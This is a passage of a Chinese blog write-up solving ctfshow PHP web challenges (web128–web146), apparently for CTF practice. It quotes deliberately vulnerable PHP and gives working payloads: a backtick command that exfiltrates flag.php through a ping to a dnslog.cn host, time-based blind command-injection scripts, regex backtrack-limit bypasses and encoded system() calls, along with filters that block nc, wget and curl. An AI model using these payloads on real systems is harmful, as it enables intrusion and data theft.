&amp;#125;else&amp;#123;
    echo &amp;quot;嗯哼？&amp;quot;;
&amp;#125;
function check($str)&amp;#123;
    return !preg_match(&#39;/[0-9]|[a-z]/i&#39;, $str);
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;call_user_func () 回调函数，看到这个函数自然想到使得第一个参数称为一个危险函数，但是 check 将所有的数字字母都过滤了，但是这里没有过滤符号，想到有一个奇怪的东西_()，_()==gettext () 是 gettext () 的拓展函数，开启 text 扩展。需要 php 扩展目录下有 php_gettext.dll&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;get_defined_vars()&lt;/strong&gt; 函数返回由所有已定义变量所组成的数组。&lt;/p&gt;
&lt;p&gt;当正常的 gettext (“get_defined_vars”); 时会返还 get_defined_vars，外层的回调函数再调用 get_defined_vars 打印所有已经定义的变量&lt;/p&gt;
&lt;p&gt;payload: ?f1=_&amp;amp;f2=get_defined_vars&lt;/p&gt;
&lt;h2 id=&#34;web129&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web129&#34;&gt;#&lt;/a&gt; web129&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;f&#39;]))&amp;#123;
    $f = $_GET[&#39;f&#39;];
    if(stripos($f, &#39;ctfshow&#39;)&amp;gt;0)&amp;#123;
        echo readfile($f);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;stripos () 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）。这里直接目录穿越即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215201702900.png&#34; alt=&#34;image-20230215201702900&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web130&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web130&#34;&gt;#&lt;/a&gt; web130&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
if(isset($_POST[&#39;f&#39;]))&amp;#123;
    $f = $_POST[&#39;f&#39;];
    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f))&amp;#123;
        die(&#39;bye!&#39;);
    &amp;#125;
    if(stripos($f, &#39;ctfshow&#39;) === FALSE)&amp;#123;
        die(&#39;bye!!&#39;);
    &amp;#125;
    echo $flag;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215201952640.png&#34; alt=&#34;image-20230215201952640&#34; /&gt;&lt;/p&gt;
&lt;p&gt;这里的是.+?，所以是 ctfshow 前面至少加一个东西才能匹配到，直接传 ctfshow 即可，或者数组绕过，stripos 不处理数组&lt;/p&gt;
&lt;h2 id=&#34;web131&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web131&#34;&gt;#&lt;/a&gt; web131&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
include(&amp;quot;flag.php&amp;quot;);
if(isset($_POST[&#39;f&#39;]))&amp;#123;
    $f = (String)$_POST[&#39;f&#39;];

    if(preg_match(&#39;/.+?ctfshow/is&#39;, $f))&amp;#123;
        die(&#39;bye!&#39;);
    &amp;#125;
    if(stripos($f,&#39;36Dctfshow&#39;) === FALSE)&amp;#123;
        die(&#39;bye!!&#39;);
    &amp;#125;

    echo $flag;

&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;str_repeat () 函数把字符串重复指定的次数。&lt;/p&gt;
&lt;p&gt;PHP 为了防止正则表达式的拒绝服务击（reDOS），给 pcre 设定了一个回溯次数上限 pcre.backtrack_limit 回溯次数上限默认是 100 万。如果回溯次数超过了 100 万，preg_match 将不再返回非 1 和 0，而是 false, 这样就可以绕过第一个正则表达式了&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests

url=&amp;quot;http://151cbf5e-eff1-412c-98b3-a1fc814ced40.challenge.ctf.show/&amp;quot;
data=&amp;#123;
    &amp;quot;f&amp;quot;:&amp;quot;a&amp;quot;*1000000+&amp;quot;36Dctfshow&amp;quot;
&amp;#125;

r=requests.post(url,data)
print(r.text)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215204538988.png&#34; alt=&#34;image-20230215204538988&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;后篇&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#后篇&#34;&gt;#&lt;/a&gt; 后篇&lt;/h1&gt;
&lt;h2 id=&#34;web132&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web132&#34;&gt;#&lt;/a&gt; web132&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215205118383.png&#34; alt=&#34;image-20230215205118383&#34; /&gt;&lt;/p&gt;
&lt;p&gt;扫描得到，访问 admin&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
#error_reporting(0);
include(&amp;quot;flag.php&amp;quot;);
highlight_file(__FILE__);
if(isset($_GET[&#39;username&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;password&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;code&#39;]))&amp;#123;
    $username = (String)$_GET[&#39;username&#39;];
    $password = (String)$_GET[&#39;password&#39;];
    $code = (String)$_GET[&#39;code&#39;];

    if($code === mt_rand(1,0x36D) &amp;amp;&amp;amp; $password === $flag || $username ===&amp;quot;admin&amp;quot;)&amp;#123;
        
        if($code == &#39;admin&#39;)&amp;#123;
            echo $flag;
        &amp;#125;       
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里有 ||，只需要满足前面两个或者后面一个即可，所以这里给 username 传入一个 admin 绕过&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230215210142212.png&#34; alt=&#34;image-20230215210142212&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web133&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web133&#34;&gt;#&lt;/a&gt; web133&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#39;F&#39;])&amp;#123;
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|netcat/i&#39;, $F))&amp;#123;
        eval(substr($F,0,6));
    &amp;#125;else&amp;#123;
        die(&amp;quot;6个字母都还不够呀?!&amp;quot;);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;本题 emmm 长度限制为 6，危险函数限制，这里构造一个&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;`$F`; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;注意这里后面是有空格的，刚好 6 个字符，就可以通过反引号执行命令，但是执行完命令后发现没有回显&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovL2Ruc2xvZy5jbi8=&#34;&gt; DNSLog Platform&lt;/span&gt; 通过这个在线工具，带出回显的结果&lt;/p&gt;
&lt;p&gt;payload：&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?F=`$F`;+ping `cat flag.php|grep ctfshow`.cez6di.dnslog.cn -c 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230216002935763.png&#34; alt=&#34;image-20230216002935763&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web134&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web134&#34;&gt;#&lt;/a&gt; web134&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET[&#39;key1&#39;]) || isset($_GET[&#39;key2&#39;]) || isset($_POST[&#39;key1&#39;]) || isset($_POST[&#39;key2&#39;])) &amp;#123;
    die(&amp;quot;nonononono&amp;quot;);
&amp;#125;
@parse_str($_SERVER[&#39;QUERY_STRING&#39;]);
extract($_POST);
if($key1 == &#39;36d&#39; &amp;amp;&amp;amp; $key2 == &#39;36d&#39;) &amp;#123;
    die(file_get_contents(&#39;flag.php&#39;));
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;extract () : 将数组转换为多个变量&lt;/p&gt;
&lt;p&gt;$_SERVER [&#39;QUERY_STRING&#39;] 获取 URL 数据，将数据转换为数组，获取单个数组元素&lt;/p&gt;
&lt;p&gt;parse_str () 函数把查询字符串解析到变量中&lt;/p&gt;
&lt;p&gt;payload:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?_POST[key1]=36d&amp;amp;_POST[key2]=36d
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web135&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web135&#34;&gt;#&lt;/a&gt; web135&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET[&#39;F&#39;])&amp;#123;
    if(!preg_match(&#39;/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i&#39;, $F))&amp;#123;
        eval(substr($F,0,6));
    &amp;#125;else&amp;#123;
        die(&amp;quot;师傅们居然破解了前面的，那就来一个加强版吧&amp;quot;);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这一题是 web133 的 “升级” 版本，打开文件的命令都被 ban 了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?F=`$F`;+cp%20flag.php%201.txt
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230216213028644.png&#34; alt=&#34;image-20230216213028644&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web136&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web136&#34;&gt;#&lt;/a&gt; web136&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
function check($x)&amp;#123;
    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\&amp;#123;|\&amp;#125;|\&amp;gt;|\&amp;lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x))&amp;#123;
        die(&#39;too young too simple sometimes naive!&#39;);
    &amp;#125;
&amp;#125;
if(isset($_GET[&#39;c&#39;]))&amp;#123;
    $c=$_GET[&#39;c&#39;];
    check($c);
    exec($c);
&amp;#125;
else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;tee 命令用于读取标准输入的数据，这里可以将执行的结果输入到新的文件然后读取&lt;/p&gt;
&lt;p&gt;payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?c=ls /| tee 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里会将 ls / 的查询结果写入 1 中&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217104454990.png&#34; alt=&#34;image-20230217104454990&#34; /&gt;&lt;/p&gt;
&lt;p&gt;再读取文件就可以了&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?c=cat /f149_15_h3r3| tee 1
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217104616360.png&#34; alt=&#34;image-20230217104616360&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web137&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web137&#34;&gt;#&lt;/a&gt; web137&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&amp;#123;
    function __wakeup()&amp;#123;
        die(&amp;quot;private class&amp;quot;);
    &amp;#125;
    static function getFlag()&amp;#123;
        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
    &amp;#125;
&amp;#125;
call_user_func($_POST[&#39;ctfshow&#39;]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里直接调用静态方法即可，payload&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ctfshow=ctfshow::getFlag
ctfshow[0]=ctfshow&amp;amp;ctfshow[1]=getFlag
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217152126627.png&#34; alt=&#34;image-20230217152126627&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web138&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web138&#34;&gt;#&lt;/a&gt; web138&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
&amp;#123;
    function __wakeup()&amp;#123;
        die(&amp;quot;private class&amp;quot;);
    &amp;#125;
    static function getFlag()&amp;#123;
        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
    &amp;#125;
&amp;#125;

if(strripos($_POST[&#39;ctfshow&#39;], &amp;quot;:&amp;quot;)&amp;gt;-1)&amp;#123;
    die(&amp;quot;private function&amp;quot;);
&amp;#125;
call_user_func($_POST[&#39;ctfshow&#39;]);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;：被 ban，还可以使用上面数组的方式&lt;/p&gt;
&lt;p&gt;call_user_func 函数里面可以传数组，第一个元素是类名或者类的一个对象，第二个元素是类的方法名，同样可以调用&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;ctfshow[0]=ctfshow&amp;amp;ctfshow[1]=getFlag
&lt;/code&gt;&lt;/pre&gt;
&lt;h2 id=&#34;web139&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web139&#34;&gt;#&lt;/a&gt; web139&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt; &amp;lt;?php
error_reporting(0);
function check($x)&amp;#123;
    if(preg_match(&#39;/\\$|\.|\!|\@|\#|\%|\^|\&amp;amp;|\*|\?|\&amp;#123;|\&amp;#125;|\&amp;gt;|\&amp;lt;|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i&#39;, $x))&amp;#123;
        die(&#39;too young too simple sometimes naive!&#39;);
    &amp;#125;
&amp;#125;
if(isset($_GET[&#39;c&#39;]))&amp;#123;
    $c=$_GET[&#39;c&#39;];
    check($c);
    exec($c);
&amp;#125;
else&amp;#123;
    highlight_file(__FILE__);
&amp;#125;
?&amp;gt; 
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这题好像和 136 一样但是使用 tee 命令却带不出回显了这里使用了一个新的命令 awk&lt;/p&gt;
&lt;p&gt;AWK 是一种处理文本文件的语言，是一个强大的文本分析工具。&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217183611353.png&#34; alt=&#34;image-20230217183611353&#34; /&gt;&lt;/p&gt;
&lt;p&gt;cut 命令用于显示每行从开头算起 num1 到 num2 的文字&lt;/p&gt;
&lt;figure class=&#34;highlight txt&#34;&gt;&lt;figcaption data-lang=&#34;txt&#34;&gt;&lt;/figcaption&gt;&lt;table&gt;&lt;tr&gt;&lt;td data-num=&#34;1&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-b ：以字节为单位进行分割。这些字节位置将忽略多字节字符边界，除非也指定了 -n 标志。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;2&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-c ：以字符为单位进行分割。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;3&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-d ：自定义分隔符，默认为制表符。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;4&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-f ：与-d一起使用，指定显示哪个区域。&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;5&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;-n ：取消分割多字节字符。仅和 -b 标志一起使用。如果字符的最后一个字节落在由 -b 标志的 List 参数指示的&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td data-num=&#34;6&#34;&gt;&lt;/td&gt;&lt;td&gt;&lt;pre&gt;范围之内，该字符将被写出；否则，该字符将被排除&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;p&gt;这里配合 cut 可以将字符单个输出&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230217183827166.png&#34; alt=&#34;image-20230217183827166&#34; /&gt;&lt;/p&gt;
&lt;p&gt;通过 shell 语法延迟，将字符转换为时间信道&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218121621350.png&#34; alt=&#34;image-20230218121621350&#34; /&gt;&lt;/p&gt;
&lt;p&gt;那么就可以做到类似时间盲注的效果，简单的整个 exp，找到存放 flag 的文件&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
import time
import string

str=string.digits+string.ascii_letters+&amp;quot;-_.&amp;quot;
#rint(str)

url=&amp;quot;http://f59ad576-2f1c-49a2-b14d-92df62c3edfa.challenge.ctf.show/?c=&amp;quot;
flag=&amp;quot;&amp;quot;

for i in range(1,10):
    for j in range(1,20):
        for s in str:
            payload = &amp;quot;if [ `ls / -1|awk \&amp;quot;NR==&amp;#123;0&amp;#125;\&amp;quot; |cut -c &amp;#123;1&amp;#125;` == \&amp;quot;&amp;#123;2&amp;#125;\&amp;quot; ];then sleep 3;fi&amp;quot;.format(i,j,s)
            payloadpro=url+payload
            #print(payloadpro)
            try:
                requests.get(payloadpro,timeout=2.5)
            except:
                flag=flag+s
                print(flag)
                break
    flag=flag+&amp;quot; &amp;quot;

print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218175130501.png&#34; alt=&#34;image-20230218175130501&#34; /&gt;&lt;/p&gt;
&lt;p&gt;接下来将命令改一下拿到 flag&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;language-python&#34;&gt;import requests
import time
import string

str=string.digits+string.ascii_letters+&amp;quot;-_.&amp;quot;
#rint(str)

url=&amp;quot;http://f59ad576-2f1c-49a2-b14d-92df62c3edfa.challenge.ctf.show/?c=&amp;quot;
flag=&amp;quot;&amp;quot;

for i in range(1,10):
    for j in range(1,50):
        for s in str:
            payload = &amp;quot;if [ `cat /f149_15_h3r3|awk \&amp;quot;NR==&amp;#123;0&amp;#125;\&amp;quot; |cut -c &amp;#123;1&amp;#125;` == \&amp;quot;&amp;#123;2&amp;#125;\&amp;quot; ];then sleep 3;fi&amp;quot;.format(i,j,s)
            payloadpro=url+payload
            #print(payloadpro)
            try:
                requests.get(payloadpro,timeout=2.5)
            except:
                flag=flag+s
                print(flag)
                break
    flag=flag+&amp;quot; &amp;quot;

print(flag)
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218175624322.png&#34; alt=&#34;image-20230218175624322&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web140&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web140&#34;&gt;#&lt;/a&gt; web140&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST[&#39;f1&#39;]) &amp;amp;&amp;amp; isset($_POST[&#39;f2&#39;]))&amp;#123;
    $f1 = (String)$_POST[&#39;f1&#39;];
    $f2 = (String)$_POST[&#39;f2&#39;];
    if(preg_match(&#39;/^[a-z0-9]+$/&#39;, $f1))&amp;#123;
        if(preg_match(&#39;/^[a-z0-9]+$/&#39;, $f2))&amp;#123;
            $code = eval(&amp;quot;return $f1($f2());&amp;quot;);
            if(intval($code) == &#39;ctfshow&#39;)&amp;#123;
                echo file_get_contents(&amp;quot;flag.php&amp;quot;);
            &amp;#125;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;最后一个 if 是一个弱类型比较，只要上面的值为 0 或者 false 或 NULL 的&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;post f1=usleep&amp;amp;f2=usleep
post f1=gmdate&amp;amp;f2=gmdate
post f1=intval&amp;amp;f2=intval
post f1=system&amp;amp;f2=system
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;等等，很多函数都可以&lt;/p&gt;
&lt;h2 id=&#34;web141&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web141&#34;&gt;#&lt;/a&gt; web141&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
    $v1 = (String)$_GET[&#39;v1&#39;];
    $v2 = (String)$_GET[&#39;v2&#39;];
    $v3 = (String)$_GET[&#39;v3&#39;];

    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
        if(preg_match(&#39;/^\W+$/&#39;, $v3))&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;if (preg_match (&#39;/^\W+$/&#39;, $v3)) 这里只能使用符号，相当于无参 rce&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;v1=1&amp;amp;v2=2&amp;amp;v3=-(~%8C%86%8C%8B%9A%92)(~%93%8C);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218195950435.png&#34; alt=&#34;image-20230218195950435&#34; /&gt;&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;?v1=1&amp;amp;v2=2&amp;amp;v3=-(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F);
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230218200028622.png&#34; alt=&#34;image-20230218200028622&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web142&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web142&#34;&gt;#&lt;/a&gt; web142&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]))&amp;#123;
    $v1 = (String)$_GET[&#39;v1&#39;];
    if(is_numeric($v1))&amp;#123;
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents(&amp;quot;flag.php&amp;quot;);
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;pre&gt;&lt;code&gt;?v1=0
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;果然是难度 0&lt;/p&gt;
&lt;h2 id=&#34;web143&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web143&#34;&gt;#&lt;/a&gt; web143&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
    $v1 = (String)$_GET[&#39;v1&#39;];
    $v2 = (String)$_GET[&#39;v2&#39;];
    $v3 = (String)$_GET[&#39;v3&#39;];
    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
        if(preg_match(&#39;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&amp;#123;|\&amp;#125;|\~|\%|\&amp;amp;|\;/i&#39;, $v3))&amp;#123;
                die(&#39;get out hacker!&#39;);
        &amp;#125;
        else&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;和 web141 一样使用无参 rce，就是加上了一些限制，但是没有过滤 ^, 这里使异或绕过即可&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180025626.png&#34; alt=&#34;image-20230220180025626&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web144&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web144&#34;&gt;#&lt;/a&gt; web144&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
    $v1 = (String)$_GET[&#39;v1&#39;];
    $v2 = (String)$_GET[&#39;v2&#39;];
    $v3 = (String)$_GET[&#39;v3&#39;];

    if(is_numeric($v1) &amp;amp;&amp;amp; check($v3))&amp;#123;
        if(preg_match(&#39;/^\W+$/&#39;, $v2))&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;

function check($str)&amp;#123;
    return strlen($str)===1?true:false;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;这里题目说是上一题的升级版，但是好像更简单？&lt;/p&gt;
&lt;p&gt;v3 的长度唯一，然后再 v2rce&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180616767.png&#34; alt=&#34;image-20230220180616767&#34; /&gt;&lt;/p&gt;
&lt;p&gt;上面的 payload 接着用就行了&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://note-1311335427.cos.ap-shanghai.myqcloud.com/images/image-20230220180644671.png&#34; alt=&#34;image-20230220180644671&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;web145&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web145&#34;&gt;#&lt;/a&gt; web145&lt;/h2&gt;
&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
highlight_file(__FILE__);
if(isset($_GET[&#39;v1&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v2&#39;]) &amp;amp;&amp;amp; isset($_GET[&#39;v3&#39;]))&amp;#123;
    $v1 = (String)$_GET[&#39;v1&#39;];
    $v2 = (String)$_GET[&#39;v2&#39;];
    $v3 = (String)$_GET[&#39;v3&#39;];
    if(is_numeric($v1) &amp;amp;&amp;amp; is_numeric($v2))&amp;#123;
        if(preg_match(&#39;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&amp;#125;|\%|\&amp;amp;|\;|\&amp;lt;|\&amp;gt;|\*|\/|\^|\#|\&amp;quot;/i&#39;, $v3))&amp;#123;
                die(&#39;get out hacker!&#39;);
        &amp;#125;
        else&amp;#123;
            $code =  eval(&amp;quot;return $v1$v3$v2;&amp;quot;);
            echo &amp;quot;$v1$v3$v2 = &amp;quot;.$code;
        &amp;#125;
    &amp;#125;
&amp;#125;
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;emmmmm 加了一些限制但是好像没有过滤取反，接着用就行&lt;/p&gt;
&lt;h2 id=&#34;web146&#34;&gt;&lt;a class=&#34;anchor&#34; href=&#34;#web146&#34;&gt;#&lt;/a&gt; web146&lt;/h2&gt;
